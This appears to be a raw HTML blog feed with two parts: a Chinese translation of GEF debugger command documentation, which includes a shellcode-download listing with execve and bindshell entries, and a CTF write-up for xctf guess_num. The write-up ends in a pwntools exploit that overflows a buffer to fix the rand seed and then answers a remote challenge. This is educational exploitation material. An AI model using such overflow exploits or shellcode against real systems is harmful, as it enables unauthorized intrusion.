class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## process-status 命令</span><br><span class="line"></span><br><span class="line">&gt; 此命令用于替换旧命令`pid`和`fd`。</span><br><span class="line"></span><br><span class="line">`process-status`提供了对当前运行进程的详尽描述，通过扩展GDB`info proc`命令提供的信息，以及来自`procfs`结构的所有信息。</span><br></pre></td></tr></table></figure><p>gef➤ ps -s zsh<br>22879<br>gef➤ attach 22879<br>[…]<br>gef➤ status<br>[+] Process Information<br>        PID  →  22879<br>        Executable  →  /bin/zsh<br>        Command line  →  ‘-zsh’<br>[+] Parent Process Information<br>        Parent PID  →  4475<br>        Command line  →  ‘tmux new -s cool vibe<br>[+] Children Process Information<br>        PID  →  26190 (Name: ‘/bin/sleep’, CmdLine: ‘sleep 100000’)<br>[+] File Descriptors:<br>        /proc/22879/fd/0  →  /dev/pts/4<br>        /proc/22879/fd/1  →  /dev/pts/4<br>        /proc/22879/fd/2  →  /dev/pts/4<br>        /proc/22879/fd/10  →  /dev/pts/4<br>[+] File Descriptors:<br>        No TCP connections</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## registers 命令</span><br><span class="line"></span><br><span class="line">`registers`命令将打印所有寄存器并取消引用任何指针。 它没有任何参数。</span><br><span class="line"></span><br><span class="line">MIPS主机上的示例：</span><br></pre></td></tr></table></figure><p>gef&gt; reg<br>$zero     : 0x00000000<br>$at       : 0x00000001<br>$v0       : 0x7fff6cd8 -&gt; 0x77e5e7f8 -&gt; &lt;<strong>libc_start_main+200&gt;: bnez v0,0x77e5e8a8<br>$v1       : 0x77ff4490<br>$a0       : 0x00000001<br>$a1       : 0x7fff6d94 -&gt; 0x7fff6e85 -&gt; “/root/demo-mips”<br>$a2       : 0x7fff6d9c -&gt; 0x7fff6e91 -&gt; “SHELL=/bin/bash”<br>$a3       : 0x00000000<br>$t0       : 0x77fc26a0 -&gt; 0x0<br>$t1       : 0x77fc26a0 -&gt; 0x0<br>$t2       : 0x77fe5000 -&gt; “_dl_fini”<br>$t3       : 0x77fe5000 -&gt; “_dl_fini”<br>$t4       : 0xf0000000<br>$t5       : 0x00000070<br>$t6       : 0x00000020<br>$t7       : 0x7fff6bc8 -&gt; 0x0<br>$s0       : 0x00000000<br>$s1       : 0x00000000<br>$s2       : 0x00000000<br>$s3       : 0x00500000<br>$s4       : 0x00522f48<br>$s5       : 0x00522608<br>$s6       : 0x00000000<br>$s7       : 0x00000000<br>$t8       : 0x0000000b<br>$t9       : 0x004008b0 -&gt; <main>: addiu sp,sp,-32<br>$k0       : 0x00000000<br>$k1       : 0x00000000<br>$s8       : 0x00000000<br>$status   : 0x0000a413<br>$badvaddr : 0x77e7a874 -&gt; &lt;</strong>cxa_atexit&gt;: lui gp,0x15<br>$cause    : 0x10800024<br>$pc       : 0x004008c4 -&gt; &lt;main+20&gt;: li v0,2<br>$sp       : 0x7fff6ca0 -&gt; 0x77e4a834 -&gt; 0x29bd<br>$hi       : 0x000001a5<br>$lo       : 0x00005e17<br>$fir      : 0x00739300<br>$fcsr     : 0x00000000<br>$ra       : 0x77e5e834 -&gt; &lt;__libc_start_main+260&gt;: lw gp,16(sp)<br>$gp       : 0x00418b20</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">## reset-cache 命令</span></span><br><span class="line"></span><br><span class="line">这是一个过时的函数，用于重置GEF内部memoize缓存，不需要再从命令行调用它。</span><br><span class="line"></span><br><span class="line">这个命令很快就会消失……</span><br><span class="line"></span><br><span class="line"><span class="section">## ropper 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`ropper`</span>是一个gadget查找工具，可以通过<span class="code">`pip`</span>轻松安装。 它提供了一个非常方便的<span class="code">`--search`</span>函数来从正则表达式搜索gadget：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/jGDxkfIgaAtH.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="code">`ropper`</span>带有一整套选项，所有选项都记录在<span class="code">`--help`</span>菜单中。</span><br><span class="line"></span><br><span class="line"><span class="section">## scan 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`scan`</span>搜索位于属于另一个程序的内存映射（haystack）中的地址。</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/JMnPmBGvDExU.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="code">`scan`</span>需要两个参数，第一个是要搜索的内存部分，第二个是要搜索的内容。 参数是针对进程内存映射的（与[<span class="string">vmmap</span>](<span class="link">https://gef.readthedocs.io/en/master/commands/scan/docs/commands/vmmap.md</span>)一样，以确定要搜索的内存范围。</span><br><span class="line"></span><br><span class="line"><span class="section">## search-pattern 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`gef`</span>允许您在在运行时搜索进程内存布局的所有段中的特定字符串。 <span class="code">`search-pattern`</span>命令，别名<span class="code">`grep`</span>，旨在直接使用：</span><br></pre></td></tr></table></figure><p>gef➤  search-pattern MyPattern</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/qjzUk3Li5iW0.png</span>)</span><br><span class="line"></span><br><span class="line">它将提供一个易于理解的特定字符串的发现，包括它/它们被发现的部分，以及与该部分相关的权限。</span><br><span class="line"></span><br><span class="line"><span class="code">`search-pattern`</span>也可用于搜索地址。 为此，只需确保您的字符串以“0x”开头并且是有效的十六进制地址。 例如：</span><br></pre></td></tr></table></figure><p>gef➤  search-pattern 0x4005f6</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/QbanlWbld2Oa.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="code">`search-pattern`</span>命令也可以用作搜索地址交叉引用的方法。 因此，别名<span class="code">`xref`</span>也指向命令<span class="code">`search-pattern`</span>。 因此，上面的命令相当于<span class="code">`xref 0x4005f6`</span>，这使得它更直观。</span><br><span class="line"></span><br><span class="line"><span class="section">## set-permission 命令</span></span><br><span class="line"></span><br><span class="line">添加此命令是为了便于漏洞利用过程，方法是直接从调试器更改特定内存页上的权限。</span><br><span class="line"></span><br><span class="line">默认情况下，<span class="code">`GDB`</span>不允许您这样做，因此该命令将修改正在调试的二进制文件的代码部分，并添加本机mprotect系统调用存根。 例如，对于x86，将插入以下存根：</span><br></pre></td></tr></table></figure><p>pushad<br>mov eax, mprotect_syscall_num<br>mov ebx, address_of_the_page<br>mov ecx, size_of_the_page<br>mov edx, permission_to_set<br>int 0x80<br>popad</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在此存根之后添加断点，该点在命中时将恢复原始上下文，允许您继续执行。</span><br></pre></td></tr></table></figure><p>mprotect<code>是</code>set-permission<code>的别名。 举个例子，在这个二进制文件中将</code>stack<code>设置为</code>READ|WRITE|EXECUTE</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/MY56Kvq0X69O.png</span>)</span><br><span class="line"></span><br><span class="line">运行</span><br></pre></td></tr></table></figure><p>gef➤ mprotect 0xfffdd000</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">就是这样! <span class="code">`gef`</span> 将使用内存运行时的信息来正确调整整个部分的保护。</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/a6nGnG0rKdNq.png</span>)</span><br><span class="line"></span><br><span class="line">或者在PowerPC VM上获得完整的演示视频： [<span class="string">![mark</span>](<span class="link">../../../../../../program/writing/images/gef/9vHvvswPk0MS.png</span>)](<span class="link">https://asciinema.org/a/54noulja01k3cgctawjeio8xl</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## shellcode 命令</span></span><br></pre></td></tr></table></figure><p>shellcode<code>是@JonathanSalwan shellcodes数据库的命令行客户端。 它可以用来直接通过</code>GEF<code>搜索和下载你正在寻找的shellcode。 有两个原始子命令，</code>search<code>和</code>get<br>gef➤ shellcode search arm<br>[+] Showing matching shellcodes<br>901     Linux/ARM       Add map in /etc/hosts file - 79 bytes<br>853     Linux/ARM       chmod(“/etc/passwd”, 0777) - 39 bytes<br>854     Linux/ARM       creat(“/root/pwned”, 0777) - 39 bytes<br>855     Linux/ARM       execve(“/bin/sh”, [], [0 vars]) - 35 bytes<br>729     Linux/ARM       Bind Connect UDP Port 68<br>730     Linux/ARM       Bindshell port 0x1337<br>[…]<br>gef➤ shellcode get 698<br>[+] Downloading shellcode id=698<br>[+] Shellcode written as ‘/tmp/sc-EfcWtM.txt’<br>gef➤ system cat /tmp/sc-EfcWtM.txt<br>/*<br>Title:     Linux/ARM - execve(“/bin/sh”, [0], [0 vars]) - 27 bytes<br>Date:      2010-09-05<br>Tested on: ARM926EJ-S rev 5 (v5l)<br>Author:    Jonathan Salwan - twitter: @jonathansalwan</p><p>shell-storm.org</p><p>Shellcode ARM without 0x20, 0x0a and 0x00<br>[…]</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## stub 命令</span><br><span class="line"></span><br><span class="line">`stub`命令允许你存根函数，可选择指定返回值。</span><br></pre></td></tr></table></figure><p>gef➤  stub [-h] [-r RETVAL] [LOCATION]</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="code">`LOCATION`</span>表示要绕过的功能的地址。 如果未指定，gef将认为程序计数器处的指令是函数的开始。</span><br><span class="line"></span><br><span class="line">如果提供了<span class="code">`-r RETVAL`</span>，gef会将返回值设置为提供的值。 否则，它会将返回值设置为0。</span><br><span class="line"></span><br><span class="line">例如，绕过<span class="code">`fork()`</span>调用是微不足道的。 由于返回值设置为0，因此它实际上将我们放入“子”进程。 必须注意的是，这是一个与经典的“set follow-fork-mode child”不同的行为，因为在这里我们不会产生一个新的进程，我们只是欺骗父进程认为它已经成为了孩子。</span><br><span class="line"></span><br><span class="line"><span class="section">### 例子</span></span><br><span class="line"></span><br><span class="line">绕过 <span class="code">`fork()`</span> 调用:</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>Without stub: ![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/8zMXiVW61qsn.png</span>)</span><br><span class="line"><span class="bullet">- </span>With stub: ![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/rI1ggEgckp5G.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## theme 命令</span></span><br><span class="line"></span><br><span class="line">通过改变颜色方案来定制<span class="code">`GEF`</span>。</span><br></pre></td></tr></table></figure><p>gef➤  theme<br>context_title_message                   : red bold<br>default_title_message                   : red bold<br>default_title_line                      : green bold<br>context_title_line                      : green bold<br>disable_color                           : 0<br>xinfo_title_message                     : blue bold</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">### 改变颜色</span></span><br><span class="line"></span><br><span class="line">您可以使用<span class="code">`theme`</span>命令更改<span class="code">`GEF`</span>显示的着色属性。 该命令接受2个参数，要更新的属性的名称及其新的着色值。</span><br><span class="line"></span><br><span class="line">颜色可以是以下之一：</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>red</span><br><span class="line"><span class="bullet">- </span>green</span><br><span class="line"><span class="bullet">- </span>blue</span><br><span class="line"><span class="bullet">- </span>yellow</span><br><span class="line"><span class="bullet">- </span>gray</span><br><span class="line"><span class="bullet">- </span>pink</span><br><span class="line"></span><br><span class="line">Color还接受以下属性：</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>bold</span><br><span class="line"><span class="bullet">- </span>underline</span><br><span class="line"><span class="bullet">- </span>highlight</span><br><span class="line"><span class="bullet">- </span>blink</span><br><span class="line"></span><br><span class="line">任何其他的值都会被忽略。</span><br></pre></td></tr></table></figure><p>gef➤  theme context_title_message blue bold foobar<br>gef➤  theme<br>context_title_message                   : blue bold<br>default_title_message                   : red bold<br>default_title_line                      : green bold<br>context_title_line                      : green bold<br>disable_color                           : 0<br>xinfo_title_message                     : blue bold</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">## tmux-setup 命令</span></span><br><span class="line"></span><br><span class="line">为了使调试会话更容易，同时更有效，<span class="code">`GEF`</span>整合了两个命令：</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span><span class="code">`tmux-setup`</span></span><br><span class="line"><span class="bullet">- </span><span class="code">`screen-setup`</span></span><br><span class="line"></span><br><span class="line">这些命令将检查GDB是否从<span class="code">`tmux`</span>（个别情况下<span class="code">`screen`</span>）会话中生成，如果是，则将垂直拆分窗格，并将上下文配置为重定向到新窗格，如下所示：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/hf8sgVMMJR4U.png</span>)</span><br><span class="line"></span><br><span class="line">要进行设置，只需输入即可</span><br></pre></td></tr></table></figure><p>gef➤ tmux-setup</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="strong">**注意**</span>：虽然<span class="code">`screen-setup`</span>提供了类似的设置，但是<span class="code">`screen`</span>的结构不允许非常干净的方式来执行此操作。 因此，如果可能，建议使用<span class="code">`tmux-setup`</span>命令。</span><br><span class="line"></span><br><span class="line"><span class="section">## trace-run 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`trace-run`</span>命令旨在直接在IDA反汇编程序中提供特定执行所采用的路径。 它应该与IDA脚本[<span class="string">`ida_color_gdb_trace.py`</span>](<span class="link">https://github.com/hugsy/stuff/blob/master/ida_scripts/ida_color_gdb_trace.py</span>)一起使用</span><br><span class="line"></span><br><span class="line">它将跟踪并存储执行流程中<span class="code">`$pc`</span>所取的所有值，从当前值到作为参数提供的值。</span><br></pre></td></tr></table></figure><p>gef➤ trace-run <address_of_last_instruction_to_trace></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/QBGdVqjYgC3V.png</span>)</span><br><span class="line"></span><br><span class="line">通过在生成的文本文件上使用脚本<span class="code">`ida_color_gdb_trace.py`</span>，它将为所采用的路径着色：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/FU8cbFFlzGmt.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## unicorn-emulate 命令</span></span><br><span class="line"></span><br><span class="line">如果您已经安装了[<span class="string">`unicorn`</span>](<span class="link">http://unicorn-engine.org/</span>) 仿真引擎及其Python绑定，<span class="code">`gef`</span>会集成一个新命令来模拟当前调试环境的指令！</span><br><span class="line"></span><br><span class="line">这个命令<span class="code">`unicorn-emulate`</span>（或它的别名<span class="code">`emu`</span>）将为你复制当前的内存映射（包括页面权限），默认情况下（即没有任何附加参数），它将模拟指令的执行显示即将执行的（即<span class="code">`$pc`</span>指向的那个）并显示哪个寄存器被它修改了。</span><br><span class="line"></span><br><span class="line">使用<span class="code">`-h`</span>寻求帮助</span><br></pre></td></tr></table></figure><p>gef➤ emu -h</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">例如，以下命令将仅执行接下来的<span class="number">2</span>条指令：</span><br></pre></td></tr></table></figure><p>gef➤ emu -n 2</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">并显示： ![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/BDfkWa1INP4W.png</span>)</span><br><span class="line"></span><br><span class="line">在这个例子中，我们可以看到执行后的结果</span><br></pre></td></tr></table></figure><p>0x80484db    &lt;main+75&gt;  xor    eax,eax<br>0x80484dd    &lt;main+77&gt;  add    esp,0x18</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">寄存器<span class="code">`eax`</span>和<span class="code">`esp`</span>被修改。</span><br><span class="line"></span><br><span class="line">一个方便的选项是<span class="code">`-o /path/to/file.py`</span>，它将生成一个嵌入当前执行上下文的纯Python脚本，可以在<span class="code">`gef`</span>之外重用！这对于处理混淆或解决使用SMT搭建的Crackme非常有用。</span><br><span class="line"></span><br><span class="line"><span class="section">## vmmap 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`vmmap`</span>显示整个内存空间映射。</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/rBcNJQyYqRo4.png</span>)</span><br><span class="line"></span><br><span class="line">正如一位聪明的读者可能已经看到的，内存映射从一个架构到另一个架构不同（这是我首先开始使用<span class="code">`GEF`</span>的主要原因之一）。 例如，您可以了解到在SPARC体系结构上运行的ELF始终将其<span class="code">`.data`</span>和<span class="code">`heap`</span>部分设置为读/写/执行。</span><br><span class="line"></span><br><span class="line"><span class="code">`vmmap`</span>接受一个参数，一个字符串来匹配结果：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/JWbpGlm9vQl8.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## xfiles 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`xfiles`</span>是GDB命令的更方便的表示，<span class="code">`info files`</span>允许您按参数中给出的模式进行过滤。 例如，如果您只想显示代码部分（即<span class="code">`.text`</span>）：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/V1YlRTLywUvo.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## xinfo 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`xinfo`</span>命令显示作为参数给出的特定地址的所有已知信息：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/OnKTDFxzHRru.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="strong">**重要说明**</span>：出于性能原因，<span class="code">`gef`</span>会缓存某些结果。 <span class="code">`gef`</span>将尝试自动刷新自己的缓存，以避免依赖已调试过程的过时信息。 然而，在一些特殊的场景中，<span class="code">`gef`</span>可能无法检测到一些新事件，使其缓存部分过时。 如果您发现内存映射存在不一致，则可能需要通过运行命令<span class="code">`reset-cache`</span>强制<span class="code">`gef`</span>刷新其缓存并获取全新数据。</span><br><span class="line"></span><br><span class="line"><span class="section">## xor-memory 命令</span></span><br><span class="line"></span><br><span class="line">此命令用于对内存块进行异或。</span><br><span class="line"></span><br><span class="line">它的语法是：</span><br></pre></td></tr></table></figure><p>xor-memory &lt;display|patch&gt; <address> <size_to_read> <xor_key></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">第一个参数（`display`或`patch`）是要执行的操作：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.</span><br></pre></td></tr></table></figure><pre><code>display<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">只显示<span class="keyword">XOR</span>-<span class="keyword">ed</span>内存块结果的hexdump，而不写入调试对象的内存。</span><br></pre></td></tr></table></figure>gef➤  xor display $rsp 16 1337[+] Displaying XOR-ing 0x7fff589b67f8-0x7fff589b6808 with &apos;1337&apos;────────────────────────────────[ Original block ]────────────────────────────────────0x00007fff589b67f8     46 4e 40 00 00 00 00 00 00 00 00 00 00 00 00 00     FN@.............────────────────────────────────[ XOR-ed block ]──────────────────────────────────────0x00007fff589b67f8     55 79 53 37 13 37 13 37 13 37 13 37 13 37 13 37     UyS7.7.7.7.7.7.7<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">2.</span></span><br></pre></td></tr></table></figure>patch<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">将使用<span class="keyword">xor</span>-<span class="keyword">ed</span>内容覆盖内存。</span><br></pre></td></tr></table></figure>gef➤  xor patch $rsp 16 1337[+] Patching XOR-ing 0x7fff589b67f8-0x7fff589b6808 with &apos;1337&apos;gef➤  hexdump byte $rsp 160x00007fff589b67f8     55 79 53 37 13 37 13 37 13 37     UyS7.7.7.7```</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>guess_num_wp</title>
      <link href="pwn/guess-num-wp/"/>
      <url>pwn/guess-num-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="xctf-guess-num-WP"><a href="#xctf-guess-num-WP" class="headerlink" title="xctf_guess_num WP"></a>xctf_guess_num WP</h1><a id="more"></a><h3 id="查文件"><a href="#查文件" class="headerlink" title="查文件"></a>查文件</h3><p>64位exb</p><p>保护全开</p><p><img src="/../images/guess-num-wp/image-20200317174455644.png" alt="image-20200317174455644"></p><!--more--><h3 id="ida-分析"><a href="#ida-分析" class="headerlink" title="ida 分析"></a>ida 分析</h3><p>ida里的吧</p><p><img src="/../images/guess-num-wp/image-20200317174518780.png" alt="image-20200317174518780"></p><p><img src="/../images/guess-num-wp/image-20200317174557409.png" alt="image-20200317174557409"></p><p>反汇编后可以看到程序利用了随机数函数生成number</p><p>srand（） 为 rand（）的发生器</p><p><img src="/../images/guess-num-wp/image-20200317174627455.png" alt="image-20200317174627455"></p><p>从这里可以得到seed参数</p><p>进入函数内部看到</p><p><img src="/../images/guess-num-wp/image-20200317174703813.png" alt="image-20200317174703813"></p><p>得出了 result 函数返回值  = buf = urandom-&gt; fd</p><p>调用的文件给了提示</p><!--qword 类型为 无符号的整型（0~2^64 - 1)--><p>think_1:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用缓冲区溢出修改seed值，固定</span><br><span class="line">但从反汇编代码看程序需要循环<span class="number">10</span>次才能正常退出循环</span><br><span class="line">漏洞函数sub_C3E()再循环体外</span><br></pre></td></tr></table></figure><p>think_2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跳过循环体  无法执行， 程序保护开满</span><br></pre></td></tr></table></figure><p>漏洞函数：</p><p><img src="/../images/guess-num-wp/image-20200317174718651.png" alt="image-20200317174718651"></p><p>c99 scanf函数</p><p><img src="/../images/guess-num-wp/image-20200317174730510.png" alt="image-20200317174730510"></p><p>看大佬wp得到</p><p>固定种子 ， 测试得到答案</p><p><img src="/../images/guess-num-wp/image-20200317174743470.png" alt="image-20200317174743470">gets参数和seed 偏移量为 0x20</p><p>构造</p><p>payload = ‘a’ *0x20 + p64(1)    <!--缓冲区溢出--></p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">最后通过加载linux内函数库调用rand函数，实现伪随机数的再实现并发送到环境内, p64(<span class="number">1</span>)为调用函数后的返回地址,</span><br><span class="line">但有时会重复利用漏洞函数，就需要用漏洞函数所在的地址来做<span class="keyword">call</span> <span class="function"><span class="keyword">function</span></span> 后的返回地址</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">r = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'44179'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>) </span><br><span class="line">r.sendlineafter(<span class="string">'Your name:'</span>,payload)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):  <span class="comment">#use python write a script</span></span><br><span class="line">num = str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">'number:'</span>)</span><br><span class="line">r.sendline(num)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
